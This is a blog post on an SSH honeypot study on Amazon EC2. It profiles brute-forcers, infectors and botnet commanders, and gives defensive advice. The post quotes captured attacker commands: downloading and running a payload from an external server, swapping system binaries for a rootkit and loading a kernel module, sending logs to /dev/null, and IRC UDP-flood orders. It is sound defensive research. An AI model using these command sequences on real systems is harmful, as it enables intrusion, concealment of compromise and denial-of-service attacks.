---
date: '2014-08-30T10:00:00+10:00'
title: 'An in-depth analysis of SSH attacks on Amazon EC2'
draft: false
tags: ["security", "cloud", "aws", "ec2", "honeypot", "ssh", "research"]
---

# Summary

The research study investigates Secure Shell (SSH) attacks on Amazon EC2 cloud instances across different AWS zones by means of deploying Smart Honeypot (SH). It provides an in-depth analysis of SSH attacks, SSH intruders profile, and attempts to identify their tactics and purposes.

Key observations for this research experiment are as following:
- Without disclosure of SH's IP addresses, **in less than 10 hours, first brute-force attempt was detected**.
- **Over 89% of intruders only targeted one SH in one zone**;
- **Three threat actors (attacker's profile) were detected** – brute-forcer, infector and commander – by which their source IP addresses were completely different;
- Typically, **blacklists are limited** to prevent the first threat actor i.e. brute-forcer and not the other two;
- Top three (3) origin country of attacks (based on whois information) were **China, Russia and Egypt**;
- Some password lists used for brute-forcing SSH service were limited to few passwords and **targeted toward compromising other malicious groups infected hosts**;
- VoIP services, network appliances and development tools account names were constantly targeted by intruders;
- Upon a successful password guess, **a new actor (Infector) appeared to upload malicious files** to SH and a connection were made to an external Command and Control server;
- A number of tactics were used to hide malicious executable, replace legitimate executable with infected ones and disable audit functionalities of the operating system;
- A third actor (Commander) employed the infected SH to **conduct denial-of-service (DoS) attacks**;
- On average intruders' source IP address was observed for a day and there was **no further connection to check the status of the infected host** or re-deploy the malicious files.

# Introduction

Start a Cloud instance and you will be shocked with the number of 'malicious' attempts against your vanilla Cloud server. Well, you may not be even aware of those if you don' monitor your network traffic, in and out of your server.

Password brute-force attempt is among one of the common security attacks and adversaries are performing Internet-wide scanning, probing and penetrating of weak credentials on SSH services.

As one of the use-cases for Smart Honeypot, I did a research experiment on SSH password brute-force attempts in Amazon EC2 environment to profile the adversaries and identify their tactics.

# Experiment setup

The following list illustrates details of the experiment.
- **Number of Smart Honeypots**: three (3)
- **Period of experiment**: fourteen (14) days
- **Start and end dates**: 7 May 2014 to 21 May 2014
- **EC2 regions**: North California (US), Oregon (US), Singapore (SG)
- **Cloud instance base-image**: Ubuntu 13.04 – EC2 Micro Instance
- **IP address**: Default EC2 Public IP range for each zone

For each SH, I used EC2 Micro Instance as a base which has a SSH service exposed by default. From external perspective, this resemble like a typical EC2 Micro Instance.

SH is equipped with its own unique technologies and at it has not borrowed from any known honeypot solution. Additionally, the techniques that are used within SH cannot be publicly disclosed in order to hide its presences from attackers and make it ideal to profile them.

No domain name was mapped to the SH public IP addresses and their addresses were not disclosed or advertised anywhere.

SSH service was modified to accept authentication through username and password (i.e. keyboard based) as well as public-private keys. An additional username (i.e. git) with a weak password was created on SSH server. The super user (i.e. root)  password was also selected from a common password word-lists. Passwords on each SH were selected differently.

Throughout the experiment, once an account was compromised and intruder was profiled, the password was changed to a different combination.

Outgoing network traffic was actively monitored and filtered. This was a safe-guard not to allow the infrastructure to be (mis)used to target other Internet hosts

# Observation

On all observations, I assume there is only one actor behind a single IP address.
- It took less than ten (10) hours to receive a first brute-force attempt on the SH.
- First successful password guess happened in 5 days and the subsequent successful attempt happened in less than 2 days.
- 91 unique successful password guesses happened during the experiment period.
- Three threat actors were identified during the experiment in which they sourced from a unique IP address.

## Brute-forcer

Brute-force (bot) attempted to brute force the target to find a correct username and password combination. As expected their behaviour was fully automated.
- Some bots attempted guessing a single username and password combination across all SHs and once unsuccessful, they move to the next password combination. This behavior was noticed since the bot IP address was observed across SHs in a short span of time (usually a few seconds);
- Some bots attempted to brute-force a set of username and password combination on a single SH and then moved to the next SH.
- Some bots used threading and initiated parallel connections to the SSH service. This behavior was noticeable as password brute-force attempt did not stop immediately after a successful guess.
- The majority of bots only targeted one SH. 12% of bots source IP address were observed on all the SHs while the remaining 88% only targeted one SH.
- The majority of bots were seen over a single day and a few over span of two days. No further activity was observed from the same source of IP address.

### Password lists

Some bots tried a limited set of passwords, normally less than 5 items. The password combination was not something common and it seems like they target particular servers or attempt to penetrate to other malicious groups compromised servers:
- @#$%hackin2inf3ctsiprepe@#$%
- darkhackerz01
- ullaiftw5hack
- t0talc0ntr0l4!

Among password there were instances such as "shangaidc" and "lanzhon" (Chinese terms) that was initially collected on Singapore-based SH however, later on, the passwords were observed on the other zones.

The majority of bots used publicly available password lists such as RockYou or 500 worst passwords lists (see https://wiki.skullsecurity.org/Passwords).

### Targeted user accounts

The majority of attempts were targeted on super accounts such as "root" or "admin". The other group of highly targeted usernames were network appliances, development tools, and VoIP services:
- teamspeak (a VoIP software, popular among video game players)
- git, svn (code repositories for software development)
- nagios, vyatta (network appliances)

### Demographic

_Note: The reader should be reminded that the information were collected only by looking at the registration information (i.e. whois) of the intruder IP address and it should not perceived as the intrusions are orchestrated by a particular nation. A computer savvy person is aware of the fact that source IP addresses can be easily spoofed._

The majority of the attempts were sourced from China. Following by Russia targeting Singapore-based SH and Egypt for US-based SHs. There was no intrusion observed from Russia on US-based SH and from Egypt on Singapore-based SHs throughout the experiment.

## Infector

Upon a successful brute-force attempt, bot stopped communicating with SH (only in one instance the bot continued brute-forcing however targeting a different user account) and it was interesting to observe there was no further connection from the bot's source IP address, instead a new IP address with the correct username and password was observed to authenticate to the SSH.

The new intruder, which I called it Infector, attempted to infect SH by using malicious scripts or binary files.

The majority of the infectors used Secure Copy (scp) to transfer files to SH while there were instances where 'wget' was used to download malicious files from an external server.

Upon successful file upload, infector executed a number of commands prior and after execution of malicious files. In the example below, infector checks for the available memory on the host, checks for last logged users, changes the permission settings on the malicious script (i.e. httpd.pl) and executes it. Finally she clears the history of her commands.

```/dev/null/commands.sh#L1
"free -m",<ret>,"last",<ret>,"cd /var/tmp",<ret>,"chmod 777 httpd.pl",<ret>,"perl httpd.pl",<ret>,"cd",<ret>,"rm -rf .bash_history",<ret>,"history -c && clear",<ret>,"history -c && clear",<ret>
```

In another example (below), infector first checks whether the system is 64bit or 32bit, then after relaxing the malicious binary permissions, it executes the binary and puts it in the background to make sure the process is running even after logging out.

```/dev/null/commands2.sh#L1
"getconf LONG_BIT",<ret>,<^V>,"chmod 0755 ./DDos32",<ret>,"/dev/null 2>&1 &",<ret>,"nohup ./DDos32 > /dev/null 2>&1 &",<ret>
```

The above two examples were found to be scripted or automated, however, there were few instances that the interaction seems to be manual. Infector was found to key-in the commands, frequently use 'backspace' key to correct the typos (see below).

```/dev/null/manual-interaction.sh#L1
bash "cd /etc",<ret>,"wget http://94.199.187.154/.../k.tgz; tar zxvf k.tgz ; rm -rf k.tgz;"
,<ret>," cd .kde; chmod +x *; ./start.sh; ",<ret>," ./bleah 87.98.216.186; 
./bleah mgx1.magex.hu; ",<ret>,"/sbin/service crond restart",<ret>,
"service crond restart",<ret>,"/etc/init.d/crond restart",<nl>,"w",<nl>,
" historye",<backspace>,<backspace>,<backspace>,<backspace>,<backspace>,<backspace>,
<backspace>,<backspace>,<backspace>,<backspace>,<backspace>,<backspace>,<backspace>,
<backspace>,<backspace>,<backspace>,<backspace>,<backspace>,<backspace>,<backspace>,
<backspace>,<backspace>,<backspace>,"oasswd",<ret>,"passwd",<ret>,
"history -c",<ret>,"exit",<ret>
```

After deployment of the malicious files, no further interactions observed from infectors. In some instances, I even killed the malicious process, in order to see if the infector attempts to reconnect and re-deploy the malicious file.

Infector used a number of techniques to hide the existence of malicious files or replace legitimate binaries with malicious equivalents. Additionally, the infector attempted to clean her tracks by resetting the audit log file or disabling it. The following is the series of commands that infector executed on the SH where she replaced the legitimate binaries with malicious ones and attempted to load and execute a malicious kernel module.

```/dev/null/malicious-commands.sh#L1-25
chmod 0755 /tmp/.bash_root.tmp3
nohup /tmp/.bash_root.tmp3
nohup /tmp/.bash_root.tmp3
chattr +i .bash_root.tmp3
chattr +i /tmp/.bash_root.tmp3
insmod /usr/lib/xpacket.ko
ln -s /etc/init.d/DbSecuritySpt /etc/rc1.d/S97DbSecuritySpt
ln -s /etc/init.d/DbSecuritySpt /etc/rc2.d/S97DbSecuritySpt
ln -s /etc/init.d/DbSecuritySpt /etc/rc3.d/S97DbSecuritySpt
ln -s /etc/init.d/DbSecuritySpt /etc/rc4.d/S97DbSecuritySpt
ln -s /etc/init.d/DbSecuritySpt /etc/rc5.d/S97DbSecuritySpt
mkdir -p /usr/bin/bsd-port
cp -f /tmp/.bash_root.tmp3 /usr/bin/bsd-port/getty
usr/bin/bsd-port/getty 
mkdir -p /usr/bin/dpkgd
cp -f /bin/netstat /usr/bin/dpkgd/netstat
mkdir -p /bin
cp -f /tmp/.bash_root.tmp3 /bin/netstat
chmod 0755 /bin/netstat
cp -f /bin/ps /usr/bin/dpkgd/ps
mkdir -p /bin
cp -f /tmp/.bash_root.tmp3 /bin/ps
chmod 0755 /bin/ps
cp -f /usr/bin/lsof /usr/bin/dpkgd/lsof
mkdir -p /usr/bin
cp -f /tmp/.bash_root.tmp3 /usr/bin/lsof
chmod 0755 /usr/bin/lsof
mkdir -p /usr/bin
cp -f /tmp/.bash_root.tmp3 /usr/bin/smm
usr/bin/smm 
ln -s /etc/init.d/selinux /etc/rc1.d/S99selinux
ln -s /etc/init.d/selinux /etc/rc2.d/S99selinux
ln -s /etc/init.d/selinux /etc/rc3.d/S99selinux
ln -s /etc/init.d/selinux /etc/rc4.d/S99selinux
ln -s /etc/init.d/selinux /etc/rc5.d/S99selinux
usr/bin/bsd-port/udevd 
insmod /usr/lib/xpacket.ko
```

The following examples shows the audit logs were disabled (i.e. piped to null).

```/dev/null/disabled-logs.txt#L1-16
ubuntu@ip-172-31-6-109:~$ ls -l /var/log
total 1040
…[SNIP]…
lrwxrwxrwx 1 root      root          9 May 20 12:26 auth.log -> /dev/null
-rw-r----- 1 syslog    adm      296097 May 18 07:24 auth.log.1
-rw-r----- 1 syslog    adm        7095 May 14 07:32 auth.log.2.gz
-rw-r--r-- 1 root      root       1535 May 13 14:16 boot.log
lrwxrwxrwx 1 root      root          9 May 20 12:26 btmp -> /dev/null
-rw-r--r-- 1 syslog    adm       37823 May 13 14:16 cloud-init.log
drwxr-xr-x 2 root      root       4096 Oct 10  2012 dist-upgrade
…[SNIP]…
lrwxrwxrwx 1 root      root          9 May 20 12:26 lastlog -> /dev/null
lrwxrwxrwx 1 root      root          9 May 20 09:48 messages -> /dev/null
lrwxrwxrwx 1 root      root          9 May 20 09:48 secure -> /dev/null
lrwxrwxrwx 1 root      root          9 May 20 12:26 security -> /dev/null
lrwxrwxrwx 1 root      root          9 May 20 12:26 utx.lastlogin -> /dev/null
lrwxrwxrwx 1 root      root          9 May 20 12:26 utx.log -> /dev/null
lrwxrwxrwx 1 root      root          9 May 20 12:26 wtmp -> /dev/null
lrwxrwxrwx 1 root      root          9 May 20 09:48 xferlog -> /dev/null
```

The following is the output of _netstat_ during the infection.

```/dev/null/netstat-output.txt#L1-12
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      673/sshd        
tcp        0      0 127.0.0.1:10808         0.0.0.0:*               LISTEN      22589/.bash_root.tm
tcp        0      0 127.0.0.1:10808         127.0.0.1:40878         ESTABLISHED 22589/.bash_root.tm
tcp        0      0 172.31.6.109:22         60.169.77.233:4660      ESTABLISHED 23350/0         
tcp        0      0 127.0.0.1:40878         127.0.0.1:10808         ESTABLISHED 22583/.bash_root.tm
tcp        0     60 172.31.6.109:37806      183.57.38.250:36000     ESTABLISHED 22583/.bash_root.tm
tcp6       0      0 :::22                   :::*                    LISTEN      673/sshd        
udp        0      0 0.0.0.0:53              0.0.0.0:*                           19684/tinydns   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           468/dhclient3
```

And the following example shows list of files uploaded and extracted on the SH.

```/dev/null/files-list.txt#L1-16
root@ip-172-31-6-109:~# ls -al /tmp
total 1848
drwxrwxrwt  4 root root    4096 May 23 01:20 .
drwxr-xr-x 24 root root    4096 May 20 11:54 ..
-rwxr-xr-x  1 root root 1344645 May 20 11:39 .bash_root.tmp3
-rwxr-xr-x  1 root root  353564 May 21 12:55 .bash_root.tmp3h
-rwxr-xr-x  1 root root       5 May 21 12:55 bill.lock
-rw-r--r--  1 root root      69 May 22 16:03 conf.n
-rwxr-xr-x  1 root root       5 May 21 12:55 gates.lock
drwxr-xr-x  2 root root    4096 Apr 21 04:17 get
-rw-r--r--  1 root root  147456 May 17 17:18 go.tar.gz
drwx------  2 root root    4096 May 20 11:52 mc-root
-rwxr-xr-x  1 root root       5 May 21 12:55 moni.lock
-rw-r--r--  1 root root      72 May 21 01:51 rc.local
-rw-r--r--  1 root root      19 May 21 01:32 resolv.conf
```

## Commander

Upon successful deployment of malicious files, in all cases, an outbound connection was initiated from the SH to a C&C server.

Commander, the third actor, is a malicious entity who controls the C&C server and remotely sends command to infected hosts.

In most cases, C&C server was IRC based and infected host joined an IRC channel and got assigned a nickname for communication with the Commander.

Throughout the experiment, the infected SHs were employed to initiate DoS attacks against two external servers:

```/dev/null/irc-commands.txt#L1-2
:Gucci!Gucci@34635712.46 PRIVMSG #Support :!bot @udpflood 198.61.234.201 53 65500 60..
:Gucci!Gucci@34635712.46 PRIVMSG #Support :!bot @udpflood 245.167.133.214 53 65500 120..
```

And below is the response from the infected host once task is completed

```/dev/null/irc-response.txt#L1
PRIVMSG #Support :.4|.12.:.3UDP DDoS.12:..4|.12 Attacking .4 198.61.234.201 53 .12 with .4 65500 .12 Kb Packets for .4 60 .12 seconds..
```

The attack was targeted on port 53 (DNS) for the duration of 60 seconds and 120 seconds. Please note that all outbound connections from SH were monitored and filtered in order to prevent any possible harm to external servers.

That's all for now. There are still other interesting points that I am investigating and will cover them in the future posts.

## How to protect yourself against SSH attacks

Three (3) tips that can strongly improve the security posture of your SSH service (there are lots other things your can do but these three will help the most):
- Be cautious of running blacklisting software such as Fail2ban. You may crash your own server (more details https://wiki.archlinux.org/index.php/fail2ban). Instead whitelist the access to the SSH service, if not possible, use an external blacklist feed to block intruders. Remember, if you use a generic blacklist feed, on average, it blocks 12% of your actual intruders;
- Disable username and password (keyboard-based) authentication on the SSH service. If not possible setup a Two-Factor authentication; and
- Run the SSH service on a non-default port (security by obscurity!).

Malicious scripts and binary files, password lists etc. are available for download to the research community. Get in touch if you interested to a receive a copy.